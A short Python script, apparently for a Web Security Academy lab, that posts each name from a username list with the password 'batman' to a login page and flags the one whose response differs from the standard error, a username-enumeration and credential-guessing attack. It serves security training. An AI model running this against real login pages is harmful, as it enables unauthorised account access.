import requests
import pathlib

WORKSPACE = pathlib.Path(__file__).parent
URL = "https://0a2e006104ba836b80ed0817008a009e.web-security-academy.net/login"

user_list = open(WORKSPACE / "original_user_list.txt").readlines()

expected = '<p class=is-warning>Invalid username or password.</p>'
size = len(user_list)

for index, user in enumerate(user_list):
    print(f"Progress: {index}/{size}")

    res = requests.post(URL, data={
        "username": user.strip(),
        "password": "batman"
    }).content.decode(encoding="utf8")

    if res.find(expected) == -1:
        print(f"Target Response found for user: {user}")
        print(res)
        break

